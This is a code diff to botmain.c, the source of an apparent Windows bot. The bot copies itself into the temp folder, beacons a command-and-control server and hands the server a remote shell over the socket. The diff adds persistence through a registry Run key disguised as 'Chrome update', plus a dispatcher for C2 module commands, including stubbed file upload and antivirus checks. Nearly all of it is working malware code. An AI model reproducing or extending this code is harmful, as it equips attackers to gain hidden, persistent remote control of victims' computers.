@@ -10,7 +10,8 @@
 /* -- static function prototypes only used in botmain.c */
 static void copy(char *src_path, char *dst_path);
 static void beacon();
-static int open_connection(SOCKET c2_sock);
+static int recv_cmd(SOCKET c2_sock);
+static int regkey_persist(char *bot_path);
 
 int main(int argc, char* argv[])
 {
@@ -31,12 +32,13 @@ int main(int argc, char* argv[])
   strcat(target_path, temp_path);
   strcat(target_path, strrchr(curr_path, '\\') + 1);
   
-  /* check if the bot already exists in the system directory */
+  /* check if the bot already exists in the temp directory */
   exists= (strcmp(target_path, curr_path) == 0);
 
   if (!exists) /* copy to system path and execute*/
     {
       copy(curr_path, target_path);
+      regkey_persist(target_path);
       ShellExecute(NULL, "open", target_path, NULL, 0, 0);
     }
   else { /* beacon c2 if bot exists in temp folder */
@@ -70,9 +72,7 @@ static void beacon()
 	  
 	  if (WSAConnect(sock, (SOCKADDR *)&server, sizeof(server), NULL, NULL, NULL, NULL)
 	      != SOCKET_ERROR)
-	    {
-	      open_connection(sock);
-	    }
+	      while (recv_cmd(sock) != -1);
 	}
 
       WSACleanup();
@@ -80,19 +80,47 @@ static void beacon()
     }
 }
 
-/* hold connection with c2 for module execution until exit command recieved */
-static int open_connection(SOCKET c2_sock)
+/* receive a module code from the c2 server and parse instructions.
+   then send success or error code. */
+static int recv_cmd(SOCKET c2_sock)
 {
-  char msg_buffer[1024]= {0};
-  int recv_size;
+  char recv_int[16]= {0};
+  char reply_int[16]= {0};
+  int module_code;
+  int result= 0;
+
+  /* default module success code */
+  strcpy(reply_int, "0");
   
-  /* get data from c2 before continuing */
-  if ((recv_size= recv(c2_sock, msg_buffer, 1024, 0)) != SOCKET_ERROR)
+  /* get module code from c2 */
+  if (recv(c2_sock, recv_int, 16, 0) > 0)
     {
-      spawn_shell((HANDLE)c2_sock);
+      sscanf(recv_int, "%d", &module_code);
+      
+      if (module_code == SPAWN_SHELL)
+	result= spawn_shell((HANDLE)c2_sock);
+
+      /* else if (module_code == CLEANUP)
+	 ...
+	 else if (module_code == FILE_UPLOAD)  
+         ... 
+         else if (module_code == GET_ENVIRONMENT)
+         ... 
+	 else if (module_code == GET_ANTIVIRUS)
+         ... */
+      else if (module_code == DISCONNECT)
+	result= -1;
+      
+      else
+	strcpy(reply_int, MODULE_NOTFOUND);
     }
+
+  if (result == 1)
+    strcpy(reply_int, MODULE_ERROR);
   
-  return 0;
+  send(c2_sock, reply_int, 16, 0);
+  
+  return result;
 }
 
 /* open a src file and copy it to the dst path */
@@ -110,6 +138,28 @@ static void copy(char *src_path, char *dst_path)
     
   fclose(src_file);
   fclose(dst_file);
+}
+
+/* open and set a registry runkey for persistance. first attempts the admin path,
+   then the user path if insufficient perms. */
+static int regkey_persist(char *bot_path)
+{
+  char *admin_key= "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+  char *user_key=  "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
+  char *key_name= "Chrome update";
+  HKEY hkey;
+  LSTATUS status;
+  
+  status= RegOpenKeyEx(HKEY_LOCAL_MACHINE, admin_key, 0, KEY_ALL_ACCESS, &hkey);
+
+  if (status == ERROR_SUCCESS) /* admin access */
+    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
+  else { /* no admin access */
+    status= RegOpenKeyEx(HKEY_CURRENT_USER, user_key, 0, KEY_ALL_ACCESS, &hkey);
+    RegSetValueEx(hkey, key_name, 0, REG_SZ, (LPBYTE)bot_path, MAX_PATH);
+  }
+      
+  return (status == ERROR_SUCCESS) ? 0 : 1;
 }
 
 
